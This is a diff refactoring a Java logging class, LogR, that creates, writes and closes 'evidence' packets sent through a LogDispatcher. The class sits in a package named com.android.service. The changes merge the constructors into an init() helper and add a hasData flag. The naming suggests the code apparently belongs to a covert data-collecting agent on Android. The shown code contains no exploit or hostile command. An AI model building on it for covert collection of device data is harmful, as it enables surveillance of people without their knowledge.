@@ -11,7 +11,6 @@ package com.android.service;
 
 import java.util.ArrayList;
 
-import com.android.service.evidence.EvidenceType;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.Utils;
 
@@ -22,13 +21,15 @@ import com.android.service.util.Utils;
 public class LogR {
 
 	/** The type. */
-	private final int type;
+	private int type;
 
 	/** The unique. */
-	private final long unique;
+	private long unique;
 
 	/** The disp. */
 	private LogDispatcher disp;
+	
+	private boolean hasData;
 
 	/** The Constant LOG_CREATE. */
 	final public static int LOG_CREATE = 0x1;
@@ -54,6 +55,18 @@ public class LogR {
 	/** The Constant LOG_PRI_MIN. */
 	final public static int LOG_PRI_MIN = 0xff;
 
+	private Packet init(final int evidence, final int priority) {
+		unique = Utils.getRandom();
+		disp = LogDispatcher.self();
+		type = evidence;
+	
+		final Packet p = new Packet(unique);
+	
+		p.setType(type);
+		p.setPriority(priority);
+		return p;
+	}
+
 	/**
 	 * Instantiates a new log, creates the evidence.
 	 * 
@@ -63,14 +76,7 @@ public class LogR {
 	 *            the priority
 	 */
 	public LogR(final int evidence, final int priority) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidence;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+		final Packet p = init(evidence, priority);
 		p.setCommand(LOG_CREATE);
 
 		send(p);
@@ -87,14 +93,7 @@ public class LogR {
 	 *            the additional
 	 */
 	public LogR(final int evidenceType, final int priority, final byte[] additional) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidenceType;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+		final Packet p = init(evidenceType, priority);
 		p.setCommand(LOG_CREATE);
 		p.setAdditional(additional);
 
@@ -104,31 +103,28 @@ public class LogR {
 	/**
 	 * Instantiates a new log, creates atomically the evidence with additional
 	 * and data.
-	 *
-	 * @param evidenceType the log type
-	 * @param priority the priority
-	 * @param additional the additional
-	 * @param data the data
+	 * 
+	 * @param evidenceType
+	 *            the log type
+	 * @param priority
+	 *            the priority
+	 * @param additional
+	 *            the additional
+	 * @param data
+	 *            the data
 	 */
-	public LogR(final int evidenceType, final int priority, final byte[] additional,
-			final byte[] data) {
-		unique = Utils.getRandom();
-		disp = LogDispatcher.self();
-		type = evidenceType;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
+	public LogR(final int evidenceType, final int priority, final byte[] additional, final byte[] data) {
+		final Packet p = init(evidenceType, priority);
 		p.setCommand(LOG_ATOMIC);
 		p.setAdditional(additional);
 		p.fill(data);
+		
+		hasData=true;
 
 		send(p);
 	}
-	
-	public LogR(final int evidenceType,  final byte[] additional,
-			final byte[] data) {
+
+	public LogR(final int evidenceType, final byte[] additional, final byte[] data) {
 		this(evidenceType, LOG_PRI_STD, additional, data);
 	}
 
@@ -166,26 +162,27 @@ public class LogR {
 
 		p.setCommand(LOG_WRITE);
 		p.fill(data);
-
 		send(p);
+		
+		hasData=true;
+		
 		return;
 	}
 
-
 	public void write(ArrayList<byte[]> bytelist) {
-        int totalLen = 0;
-        for (byte[] token : bytelist) {
-			totalLen+=token.length;
+		int totalLen = 0;
+		for (final byte[] token : bytelist) {
+			totalLen += token.length;
 		}
 
-        final int offset = 0;
-        final byte[] buffer = new byte[totalLen];
-        final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);
+		final int offset = 0;
+		final byte[] buffer = new byte[totalLen];
+		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);
 
-        for (byte[] token : bytelist) {
-        	 databuffer.write(token);
+		for (final byte[] token : bytelist) {
+			databuffer.write(token);
 		}
-        
+
 		write(buffer);
 	}
 
@@ -196,8 +193,11 @@ public class LogR {
 		final Packet p = new Packet(unique);
 
 		p.setCommand(LOG_CLOSE);
-
 		send(p);
 		return;
+	}
+
+	public boolean hasData() {
+		return hasData;
 	}
 }
